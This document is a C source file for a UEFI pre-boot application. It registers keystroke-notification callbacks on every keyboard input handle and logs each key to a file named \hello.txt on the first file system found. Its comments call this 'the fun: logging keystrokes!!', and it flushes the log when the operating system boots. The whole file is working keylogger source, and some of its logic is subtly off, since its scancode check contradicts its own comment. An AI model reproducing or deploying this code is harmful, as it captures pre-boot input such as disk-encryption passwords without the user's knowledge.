#include <efi.h>
#include <efilib.h>

// globals
EFI_FILE_PROTOCOL *File;
EFI_GUID gEfiSimpleTextInputExProtocolGuid = EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID;
EFI_EVENT KeyEvent;
EFI_EVENT mExitBootServicesEvent = NULL;


UINTN AsciiStrLen (IN CONST CHAR8 *String)
{
    UINTN Length = 0;
    while (*String != '\0') {
        Length++;
        String++;
    }
    return Length;
}

EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
{
    /*
    * for reference
    CHAR8 *message = "Hello, World!\n";
    const UINTN messageSize = AsciiStrLen(message) + 1; // one extra for the null terminator
    Print(L"Message: %a\n", message);
    Print(L"Message size: %d bytes.\n", messageSize);
    Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, message);
    Print(L"Wrote %d bytes.\n", messageSize);
    if (EFI_ERROR(Status)) {
        Print(L"Error writing to the file!\n");
        return Status;
    }*/

    // allocate a buffer
    CHAR16 buffer[32];

    // check the scancode
    // if it is zero, buffer should be "CHAR=<char>\n\0"
    // if it is not zero, buffer should be "CODE=<code>\n\0"
    if (KeyData->Key.ScanCode == 0)
    {
        SPrint(buffer, 32, L"CODE=%c\n", KeyData->Key.ScanCode);
    }
    else
    {
        SPrint(buffer, 32, L"CHAR=%c\n", KeyData->Key.UnicodeChar);
    }

    // now write to the file

    UINTN messageSize = StrLen(buffer) * sizeof(CHAR16);
    const UINTN Status = File->Write(File, &messageSize, &buffer);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    return EFI_SUCCESS;
}

// we need to know when the OS is being booted
// and save the key log to a file
// otherwise, we might lose our record!
VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
{
    // this very simply just flushes and closes the file
    // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
    // that means no addressing, freeing, etc.
    // so basically we can't write to the file or declare variables or anything fancy like that.
    File->Flush(File);

    File->Close(File);
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_STATUS Status;
    UINTN HandleCount;
    EFI_HANDLE *HandleBuffer;
    EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *KeyboardProtocol;

    // Initialize the library
    InitializeLib(ImageHandle, SystemTable);

    // create exit boot services event
    Status = gBS->CreateEvent(
        EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
        TPL_NOTIFY,
        exit_boot_services,            // function to call
        NULL,                          // NotifyContext
        &mExitBootServicesEvent        // event
    );

    // Locate all handles that support the Simple File System Protocol
    Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    // Iterate through the handles to find a valid file system
    for (UINTN Index = 0; Index < HandleCount; Index++) {
        Status = uefi_call_wrapper(BS->HandleProtocol, 3, HandleBuffer[Index], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem);
        if (!EFI_ERROR(Status)) {
            break;
        }
    }

    if (EFI_ERROR(Status)) {
        Print(L"Error initializing the protocol! %d\n", Status);
        return Status;
    }

    // open the volume
    EFI_FILE_PROTOCOL *Root;
    Status = uefi_call_wrapper(FileSystem->OpenVolume, 2, FileSystem, &Root);
    if (EFI_ERROR(Status)) {
        // Handle error
        Print(L"Error opening the volume!\n");
        return Status;
    }

    // open \hello.txt

    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, L"\\hello.txt", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
        // Handle error
        Print(L"Error opening the file! %d\n", Status);
        return Status;
    }


    // Now for the fun: logging keystrokes!!
    // Locate all handles that support the EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL
    Status = BS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to locate handles for Simple Text Input Ex Protocol\n");
        return Status;
    }

    for (UINTN i = 0; i < HandleCount; i++) {
        Status = BS->HandleProtocol(HandleBuffer[i], &gEfiSimpleTextInputExProtocolGuid, (VOID **)&KeyboardProtocol);
        if (!EFI_ERROR(Status)) {
            Status = KeyboardProtocol->RegisterKeyNotify(KeyboardProtocol, NULL, key_notify_function, &KeyEvent);
            if (EFI_ERROR(Status)) {
                Print(L"Failed to register key notify function\n");
            }
        }
    }

    BS->FreePool(HandleBuffer);

    return EFI_SUCCESS;
}


    